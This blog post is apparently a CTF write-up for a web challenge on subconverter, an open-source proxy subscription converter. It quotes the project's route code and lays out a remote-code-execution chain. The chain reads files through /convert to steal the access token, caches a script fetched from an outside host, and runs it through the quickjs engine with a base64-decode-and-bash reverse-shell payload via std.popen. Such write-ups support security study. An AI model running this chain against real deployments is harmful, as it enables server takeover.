---
layout: post
author: L3moon龙
tags: [Web, WMD2022]
---
# Web (subconverter) Write Up by @L3mon 

The title gives an `open source proxy subscription converter`: [https://github.com/tindy2013/subconverter]
it is a C++ project    

To get the source code, first look for the route and check the authentication logic  

```c++
/*
webServer.append_response("GET", "/", "text/plain", [](RESPONSE_CALLBACK_ARGS) -> std::string
{
return "subconverter " VERSION " backend\n";
});
*/

webServer.append_response("GET", "/version", "text/plain", [](RESPONSE_CALLBACK_ARGS) -> std::string
    {
        return "subconverter " VERSION " backend\n";
    });

webServer.append_response("GET", "/refreshrules", "text/plain", [](RESPONSE_CALLBACK_ARGS) -> std::string
    {
        if(global.accessToken.size())
        {
            std::string token = getUrlArg(request.argument, "token");
            if(token != global.accessToken)
            {
                response.status_code = 403;
                return "Forbidden\n";
            }
        }
        refreshRulesets(global.customRulesets, global.rulesetsContent);
        return "done\n";
    });

webServer.append_response("GET", "/readconf", "text/plain", [](RESPONSE_CALLBACK_ARGS) -> std::string
    {
        if(global.accessToken.size())
        {
            std::string token = getUrlArg(request.argument, "token");
            if(token != global.accessToken)
            {
                response.status_code = 403;
                return "Forbidden\n";
            }
        }
        readConf();
        if(!global.updateRulesetOnRequest)
            refreshRulesets(global.customRulesets, global.rulesetsContent);
        return "done\n";
    });

webServer.append_response("POST", "/updateconf", "text/plain", [](RESPONSE_CALLBACK_ARGS) -> std::string
    {
        if(global.accessToken.size())
        {
            std::string token = getUrlArg(request.argument, "token");
            if(token != global.accessToken)
            {
                response.status_code = 403;
                return "Forbidden\n";
            }
        }
        std::string type = getUrlArg(request.argument, "type");
        if(type == "form")
            fileWrite(global.prefPath, getFormData(request.postdata), true);
        else if(type == "direct")
            fileWrite(global.prefPath, request.postdata, true);
        else
        {
            response.status_code = 501;
            return "Not Implemented\n";
        }

        readConf();
        if(!global.updateRulesetOnRequest)
            refreshRulesets(global.customRulesets, global.rulesetsContent);
        return "done\n";
    });

webServer.append_response("GET", "/flushcache", "text/plain", [](RESPONSE_CALLBACK_ARGS) -> std::string
    {
        if(getUrlArg(request.argument, "token") != global.accessToken)
        {
            response.status_code = 403;
            return "Forbidden";
        }
        flushCache();
        return "done";
    });

webServer.append_response("GET", "/sub", "text/plain;charset=utf-8", subconverter);

webServer.append_response("GET", "/sub2clashr", "text/plain;charset=utf-8", simpleToClashR);

webServer.append_response("GET", "/surge2clash", "text/plain;charset=utf-8", surgeConfToClash);

webServer.append_response("GET", "/getruleset", "text/plain;charset=utf-8", getRuleset);

webServer.append_response("GET", "/getprofile", "text/plain;charset=utf-8", getProfile);

webServer.append_response("GET", "/qx-script", "text/plain;charset=utf-8", getScript);

webServer.append_response("GET", "/qx-rewrite", "text/plain;charset=utf-8", getRewriteRemote);

webServer.append_response("GET", "/render", "text/plain;charset=utf-8", renderTemplate);

webServer.append_response("GET", "/convert", "text/plain;charset=utf-8", getConvertedRuleset);

if(!global.APIMode)
{
webServer.append_response("GET", "/get", "text/plain;charset=utf-8", [](RESPONSE_CALLBACK_ARGS) -> std::string
{
std::string url = urlDecode(getUrlArg(request.argument, "url"));
return webGet(url, "");
});

webServer.append_response("GET", "/getlocal", "text/plain;charset=utf-8", [](RESPONSE_CALLBACK_ARGS) -> std::string
{
return fileGet(urlDecode(getUrlArg(request.argument, "path")));
});
} 
```

obviously the token parameter is used for authentication of some routes Among them, the /version route can get the current version to visit It is found that the code given in the title is the f9713b4 branch version It is an unreleased latest version, it seems to be a 0day Re-pull the code to start auditing the latest version 

## How To Get RCE ? 

The project has a built-in script engine called quickjs :

Tracing the call found that the script engine is called when the profile is converted and authentication is required
The URL satisfies script: at the beginning to enter the branch
When reading the script, the fileGet function is used to read the file and only ordinary files can be read
Conditions for using this point: authentication + writing to a file

Continue to view other eval calls 
![image](https://cdn.nlark.com/yuque/0/2022/png/25577536/1661081022735-751a676a-6f50-4289-97e0-89e5b6ea489f.png#clientId=u53fbcb21-0ef7-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=534&id=u542126ba&margin=%5Bobject%20Object%5D&name=%E5%9B%BE%E7%89%87.png&originHeight=667&originWidth=1080&originalType=binary&ratio=1&rotation=0&showTitle=false&size=71524&status=done&style=none&taskId=u8394ba25-b5f5-4633-b229-e695f238f86&title=&width=864)

This script engine is also used in scheduled tasks
The difference here is that the fetchFile function is used here 
![image](https://cdn.nlark.com/yuque/0/2022/png/25577536/1661081233533-78e163d9-758a-4d65-9da0-53e99fb239c2.png#clientId=u53fbcb21-0ef7-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=716&id=uaafa1de0&margin=%5Bobject%20Object%5D&name=%E5%9B%BE%E7%89%87.png&originHeight=895&originWidth=1094&originalType=binary&ratio=1&rotation=0&showTitle=false&size=97150&status=done&style=none&taskId=uc1c16d7e-380d-4913-8196-5a573c22b0b)

The script path of the scheduled task uses the configuration items in the configuration file Conditions of use: 
modify the configuration file 

## File Write : 
The code below webGet caught my attention this function implements a simple cache function for caching remote subscriptions
The file was written during the caching process The request will be cached only when cache_ttl>0 After some searching, I found a cache route with added ttl

![image](https://cdn.nlark.com/yuque/0/2022/png/25577536/1661081707756-f8cd69b3-e5ee-4079-b3a5-c03ff58af883.png#clientId=uab9fe332-309a-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=129&id=uef3c2060&margin=%5Bobject%20Object%5D&name=%E5%9B%BE%E7%89%87.png&originHeight=161&originWidth=1168&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23160&status=done&style=none&taskId=ua93f87c5-5c74-4355-914e-fd8a2de588a&title=&width=934.4)


so we need to Visit `/convert?url= http://1.1.1.1:8000/1.js` to initiate a cache request 

## arbitrary file read :
The convert route calls the fetchFile function to get the file content. This function can read local files.
After convert reads the file, it only performs a simple regular replacement on the file. Therefore, we can use this route to read any file. 

and we Successfully read the configuration file in the current directory (in fact, this project still has a bunch of files to read point x)

Authentication token received 

## Construct quickjs script :

Find the function list corresponding to the library introduced in the code in the official documentation Soon a common command execution function popen was found in the std library 
![image](https://cdn.nlark.com/yuque/0/2022/png/25577536/1661083415735-e4fc67a6-a02e-4103-9033-d63df0d3a8e7.png#clientId=uab9fe332-309a-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=613&id=u9a21dd19&margin=%5Bobject%20Object%5D&name=%E5%9B%BE%E7%89%87.png&originHeight=766&originWidth=1792&originalType=binary&ratio=1&rotation=0&showTitle=false&size=124373&status=done&style=none&taskId=u5e9c34f1-0560-4af6-afd8-e9766ea7552&title=&width=1433.6)

Construct a rebound shell directly 
```js
std.popen("bash -c 'echo payloadb64 |base64 -d|bash'", "r");
```

## RCE Chain :

1. Read Configuration File to get the authentication token 
2. cache the remote file to write the file using `/convert?url= http://1.1.1.1:8000/1.js`
3. Calculate the cache file name and enter the token to trigger the subscription conversion execution script
`/sub?token=K5unAFg0wPO1j&target=clash&url=script:cache/c290fb8309721db5f8622eb278635c1a`
4. get shell uwu 

![uwu](https://cdn.nlark.com/yuque/0/2022/png/25577536/1661083723485-882bdb34-42ea-419b-b2ce-e23bcca457d1.png#clientId=uab9fe332-309a-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=545&id=ub01e4e63&margin=%5Bobject%20Object%5D&name=%E5%9B%BE%E7%89%87.png&originHeight=681&originWidth=809&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33074&status=done&style=none&taskId=u584032ce-1daf-4760-9b54-dc45f873f93&title=&width=647.2)

# Conclusion 

Read the documentation of the library used in the code, and then find the corresponding function to construct the script and always ask masters for advice. 

> with love by l3mon